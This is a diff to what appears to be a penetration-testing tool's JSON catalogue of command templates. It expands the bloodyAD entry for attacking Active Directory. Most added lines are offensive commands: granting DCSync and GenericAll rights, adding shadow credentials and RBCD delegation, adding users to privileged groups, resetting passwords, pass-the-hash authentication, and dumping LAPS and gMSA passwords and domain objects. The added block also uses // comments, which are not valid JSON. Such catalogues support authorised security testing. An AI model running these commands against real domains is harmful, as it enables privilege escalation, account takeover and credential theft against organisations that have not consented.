@@ -12,19 +12,87 @@
       { "desc": "LDAP scripts", "cmd": "nmap -p 389,636 --script ldap-rootdse,ldap-search {{IP}}" }
     ]
   },
-  {
-    "tool": "bloodyAD",
-    "tags": ["AD", "LDAP", "ACL", "privesc"],
-    "commands": [
-      { "desc": "DNS Query", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap dnsquery" },
-      { "desc": "Get Domain Users", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} getObjectAttributes Users" },
-      { "desc": "Get Domain Admins", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} getObjectAttributes 'Domain Admins' member" },
-      { "desc": "Add user to group", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} addObjectToGroup {{TARGET_USER}} 'Domain Admins'" },
-      { "desc": "Change user password", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} changePassword {{TARGET_USER}} 'NewPass123!'" },
-      { "desc": "Get LAPS password", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} getObjectAttributes {{TARGET}} ms-Mcs-AdmPwd" },
-      { "desc": "Get user attributes", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} getObjectAttributes {{TARGET_USER}}" }
-    ]
-  },
+ {
+  "tool": "bloodyAD",
+  "tags": ["AD", "LDAP", "ACL", "privesc", "RBCD", "shadow-creds", "ADCS"],
+  "commands": [
+
+    // =========================
+    // ADD COMMANDS
+    // =========================
+
+    { "desc": "Add user to group", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add groupMember '{{GROUP}}' {{TARGET_USER}}" },
+    { "desc": "Add new user", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add user {{TARGET_USER}} '{{NEWPASS}}'" },
+    { "desc": "Add new computer", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add computer {{HOSTNAME}} '{{NEWPASS}}'" },
+    { "desc": "Add DCSync rights", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add dcsync {{TARGET_USER}}" },
+    { "desc": "Grant GenericAll", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add genericAll {{TARGET}} {{TRUSTEE}}" },
+    { "desc": "Add RBCD", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add rbcd {{TARGET}} {{SERVICE}}" },
+    { "desc": "Add shadow credentials", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add shadowCredentials {{TARGET_USER}}" },
+    { "desc": "Add DNS record", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add dnsRecord {{NAME}} {{IP}}" },
+    { "desc": "Add UAC flag", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add uac {{TARGET}} -f {{FLAG}}" },
+    { "desc": "Add badSuccessor DMSA", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add badSuccessor {{DMSA}}" },
+
+    // =========================
+    // GET COMMANDS
+    // =========================
+
+    { "desc": "Get object attributes", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get object {{TARGET}}" },
+    { "desc": "Get specific attribute", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get object {{TARGET}} --attr {{ATTR}}" },
+    { "desc": "Get membership", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get membership {{TARGET}}" },
+    { "desc": "Get writable objects", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get writable" },
+    { "desc": "Get children", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get children --target '{{DN}}'" },
+    { "desc": "Get all users", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get children --otype user" },
+    { "desc": "Get all computers", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get children --otype computer" },
+    { "desc": "LDAP search", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get search --filter '{{FILTER}}'" },
+    { "desc": "DNS dump", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get dnsDump" },
+    { "desc": "Domain trusts", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get trusts" },
+    { "desc": "BloodHound collection", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get bloodhound" },
+
+    // =========================
+    // SET COMMANDS
+    // =========================
+
+    { "desc": "Set password", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} set password {{TARGET}} '{{NEWPASS}}'" },
+
+    // =========================
+    // REMOVE COMMANDS
+    // =========================
+
+    { "desc": "Remove user from group", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} remove groupMember '{{GROUP}}' {{TARGET_USER}}" },
+    { "desc": "Remove shadow credentials", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} remove shadowCredentials {{TARGET_USER}}" },
+
+    // =========================
+    // AUTH METHODS
+    // =========================
+
+    { "desc": "Kerberos auth (ccache)", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -k ccache={{CCACHE}} get object {{TARGET}}" },
+    { "desc": "Pass-the-Hash", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p '{{LMHASH}}:{{NTHASH}}' get object {{TARGET}}" },
+    { "desc": "Certificate auth", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -c '{{KEY}}:{{CERT}}' get object {{TARGET}}" },
+
+    // =========================
+    // MSLDAP IMPORTANT COMMANDS
+    // =========================
+
+    { "desc": "MSLDAP whoami", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap whoami" },
+    { "desc": "Dump all domain objects", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap dump" },
+    { "desc": "List Domain Admins", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap dadms" },
+    { "desc": "List Kerberoastable users", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap spns" },
+    { "desc": "AS-REP roastable users", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap asrep" },
+    { "desc": "List constrained delegation", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap constrained" },
+    { "desc": "List unconstrained delegation", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap unconstrained" },
+    { "desc": "Get LAPS passwords", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap laps" },
+    { "desc": "List GMSA accounts", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap gmsa" },
+    { "desc": "Add user (msldap)", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap adduser {{DN}} '{{PASSWD}}'" },
+    { "desc": "Add user to group (msldap)", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap addusertogroup {{USER_DN}} {{GROUP_DN}}" },
+    { "desc": "Change user password (msldap)", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap changeuserpw {{USER_DN}} '{{NEWPASS}}'" },
+    { "desc": "Add SPN", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap addspn {{USER_DN}} {{SPN}}" },
+    { "desc": "Delete user", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap deluser {{USER_DN}}" },
+    { "desc": "Enable user", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap enableuser {{USER_DN}}" },
+    { "desc": "Disable user", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap disableuser {{USER_DN}}" },
+    { "desc": "LDAP query", "cmd": "bloodyAD -H {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap query '{{LDAP_QUERY}}'" }
+
+  ]
+},
   {
     "tool": "impacket",
     "tags": ["kerberos", "SMB", "AD", "RPC", "relay", "dump"],
